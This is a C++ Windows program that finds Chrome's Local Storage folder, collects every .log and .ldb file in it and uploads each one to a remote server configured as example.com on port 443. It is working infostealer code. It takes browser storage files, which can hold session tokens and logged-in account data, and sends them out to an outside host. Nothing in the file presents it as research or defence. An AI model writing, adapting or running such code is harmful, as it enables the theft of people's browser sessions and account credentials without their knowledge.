#include <windows.h>
#include <iostream>
#include "helper.hpp"
#include "Channel.hpp"

using namespace std;

wstring SERVER      = L"example.com";
int     PORT        = 443;
wstring UPLOAD_PATH = L"/upload/";
wstring FieldName   = L"file";

int main() {
    try {
        wstring chromeStoragePath = GetChromeLocalStoragePath();
        printf("Found Chrome storage path: %ls\n", chromeStoragePath.c_str());

        wstring searchPath = chromeStoragePath + L"\\*.log";
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            printf("No log files found\n");
            return 1;
        }

        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                wstring fileName = findFileData.cFileName;
                wstring fullPath = chromeStoragePath + L"\\" + fileName;
                printf("Found log file: %ls\n", fileName.c_str());

                if (UploadFile(SERVER, PORT, UPLOAD_PATH, fullPath, FieldName)) {
                    printf("Successfully uploaded: %ls\n", fileName.c_str());
                }
                else {
                    printf("Failed to upload: %ls\n", fileName.c_str());
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);

        searchPath = chromeStoragePath + L"\\*.ldb";
        hFind = FindFirstFile(searchPath.c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            printf("No ldb files found\n");
            return 1;
        }

        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                wstring fileName = findFileData.cFileName;
                wstring fullPath = chromeStoragePath + L"\\" + fileName;
                printf("Found ldb file: %ls\n", fileName.c_str());

                if (UploadFile(SERVER, PORT, UPLOAD_PATH, fullPath, FieldName)) {
                    printf("Successfully uploaded: %ls\n", fileName.c_str());
                }
                else {
                    printf("Failed to upload: %ls\n", fileName.c_str());
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);

    }
    catch (const exception& e) {
        printf("Error: %s\n", e.what());
        return 1;
    }

    printf("Program completed successfully\n");
    return 0;
}